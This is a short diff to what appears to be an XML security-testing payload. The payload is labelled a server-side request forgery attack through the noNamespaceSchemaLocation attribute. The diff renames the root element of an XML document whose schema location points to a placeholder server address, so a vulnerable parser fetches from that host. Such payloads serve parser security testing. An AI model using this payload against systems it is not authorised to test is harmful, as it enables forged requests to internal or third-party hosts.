@@ -8,4 +8,4 @@ description: Server Side Request Forgery Attack via SchemaLocation noNamespace-A
 content: schemalocation-nonamespace.xsd
 log-request: yes
 -->
-<data xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="http://{server_address}/schemalocation-nonamespace.xsd">This is a test.</data>
+<root xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="http://{server_address}/schemalocation-nonamespace.xsd">This is a test.</root>
